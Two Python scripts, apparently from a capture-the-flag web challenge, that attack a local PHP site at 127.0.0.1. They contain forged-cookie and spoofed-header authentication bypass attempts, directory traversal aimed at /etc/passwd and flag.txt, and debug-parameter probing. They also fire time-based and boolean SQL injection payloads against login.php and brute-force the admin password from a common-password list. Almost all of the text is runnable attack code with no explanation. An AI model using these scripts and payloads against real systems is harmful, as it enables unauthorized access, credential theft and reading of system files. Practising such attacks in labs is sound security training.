import requests
import re

base_url = "http://127.0.0.1:33026"
session = requests.Session()

print("SECTION 11: INVESTIGATING 'FLAG' IN INDEX.PHP")
print("=" * 80)

resp = session.get(f"{base_url}/index.php")
print(f"Searching for 'flag' context in index.php...")

# Find all occurrences with context
matches = list(re.finditer(r'.{100}flag.{100}', resp.text, re.IGNORECASE))
for m in matches:
    print(f"\nMatch: ...{m.group()}...")

# Also check all text
lines = resp.text.split('\n')
for i, line in enumerate(lines):
    if 'flag' in line.lower():
        print(f"\nLine {i}: {line}")

print("\n" + "=" * 80)
print("SECTION 12: AUTHENTICATION BYPASS TESTING")
print("=" * 80)

# Test session fixation/cookie manipulation
# First check what cookies are set during login attempt

# Test with cookie manipulation
print("\nTesting home.php with various cookies:")
cookie_tests = [
    {"PHPSESSID": "admin"},
    {"session": "admin"},
    {"auth": "1"},
    {"authenticated": "true"},
    {"user": "admin"},
    {"role": "admin"},
    {"admin": "1"},
]

for cookies in cookie_tests:
    resp = session.get(f"{base_url}/home.php", cookies=cookies, allow_redirects=False)
    print(f"\nCookies: {cookies}")
    print(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"  [!] SUCCESS - accessed home.php!")
        print(f"  Response: {resp.text[:500]}")
    elif resp.status_code == 302:
        print(f"  Redirect: {resp.headers.get('Location')}")

# Test HTTP header injection
print("\n" + "=" * 80)
print("SECTION 13: HEADER-BASED AUTH BYPASS")
print("=" * 80)

header_tests = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Original-URL": "/home.php"},
    {"X-Rewrite-URL": "/home.php"},
    {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin base64
]

for headers in header_tests:
    resp = session.get(f"{base_url}/home.php", headers=headers, allow_redirects=False)
    print(f"\nHeaders: {headers}")
    print(f"  Status: {resp.status_code}")
    if resp.status_code == 200:
        print(f"  [!] SUCCESS!")
        print(f"  Response: {resp.text[:500]}")

print("\n" + "=" * 80)
print("SECTION 14: DIRECTORY TRAVERSAL ON KNOWN FILES")
print("=" * 80)

traversal_tests = [
    "/images/../../../etc/passwd",
    "/images/../../../flag.txt",
    "/images/../../../home.php",
    "/style.css/../../../etc/passwd",
]

for path in traversal_tests:
    resp = session.get(f"{base_url}{path}", allow_redirects=False)
    print(f"\nPath: {path}")
    print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
    if "root:" in resp.text:
        print(f"  [!] LFI SUCCESS - passwd found!")
        print(f"  Content: {resp.text[:200]}")

print("\n" + "=" * 80)
print("SECTION 15: CHECKING FOR DEBUG PARAMETERS")
print("=" * 80)

debug_tests = [
    "/index.php?debug=1",
    "/index.php?debug=true",
    "/login.php?debug=1",
    "/home.php?debug=1",
    "/contact.php?debug=1",
]

for url in debug_tests:
    resp = session.get(f"{base_url}{url}")
    print(f"\n{url}")
    print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
    # Check for debug output
    if "debug" in resp.text.lower() or "array" in resp.text.lower() or "object" in resp.text.lower():
        print(f"  [?] Possible debug output")
        print(f"  Snippet: {resp.text[:400]}")


import requests
import time

base_url = "http://127.0.0.1:33026"
session = requests.Session()

print("SECTION 16: TIME-BASED SQL INJECTION")
print("=" * 80)

time_based_payloads = [
    ("admin' AND SLEEP(2)--", "MySQL SLEEP"),
    ("admin' AND BENCHMARK(5000000,SHA1('test'))--", "MySQL BENCHMARK"),
    ("admin'; WAITFOR DELAY '0:0:2'--", "MSSQL WAITFOR"),
    ("admin' AND pg_sleep(2)--", "PostgreSQL pg_sleep"),
    ("admin' OR (SELECT SLEEP(2))--", "MySQL SELECT SLEEP"),
    ("admin' AND (SELECT * FROM (SELECT(SLEEP(2)))a)--", "MySQL nested SLEEP"),
]

for payload, name in time_based_payloads:
    start = time.time()
    try:
        resp = session.post(f"{base_url}/login.php",
                           data={"username": payload, "password": "test"},
                           timeout=10)
        elapsed = time.time() - start
        
        print(f"\n{name}:")
        print(f"  Elapsed: {elapsed:.2f}s")
        if elapsed >= 1.9:
            print(f"  [!] TIME DELAY DETECTED!")
    except Exception as e:
        elapsed = time.time() - start
        print(f"\n{name}: Error after {elapsed:.2f}s - {e}")

print("\n" + "=" * 80)
print("SECTION 17: BOOLEAN-BASED SQL INJECTION")
print("=" * 80)

boolean_tests = [
    ("admin' AND '1'='1", "True condition"),
    ("admin' AND '1'='2", "False condition"),
    ("admin' OR '1'='1", "OR true"),
    ("admin' OR '1'='2", "OR false"),
]

responses = {}
for payload, name in boolean_tests:
    resp = session.post(f"{base_url}/login.php",
                       data={"username": payload, "password": "test"},
                       timeout=5)
    responses[name] = len(resp.content)
    print(f"\n{name}:")
    print(f"  Payload: {payload}")
    print(f"  Length: {len(resp.content)}B")

# Check for differences
lengths = list(responses.values())
if len(set(lengths)) > 1:
    print(f"\n[!] RESPONSE SIZE DIFFERENCE DETECTED!")
    print(f"  Sizes: {responses}")

print("\n" + "=" * 80)
print("SECTION 18: LOGIN BRUTE FORCE WITH COMMON PASSWORDS")
print("=" * 80)

common_passwords = [
    "password", "123456", "admin", "root", "toor", "test",
    "guest", "qwerty", "letmein", "welcome", "monkey",
    "dragon", "master", "abc123", "login", "pass",
    "changeme", "secret", "administrator", "admin123"
]

for pwd in common_passwords[:10]:
    resp = session.post(f"{base_url}/login.php",
                       data={"username": "admin", "password": pwd},
                       timeout=5,
                       allow_redirects=False)
    
    print(f"admin/{pwd}: {resp.status_code} | {len(resp.content)}B", end="")
    
    if resp.status_code == 302:
        print(f" -> {resp.headers.get('Location')}")
        if "home" in resp.headers.get('Location', '').lower() or "index" not in resp.headers.get('Location', '').lower():
            print(f"  [!] POTENTIAL SUCCESS!")
    elif resp.cookies:
        print(f" | Cookies: {dict(resp.cookies)}")
    else:
        print()

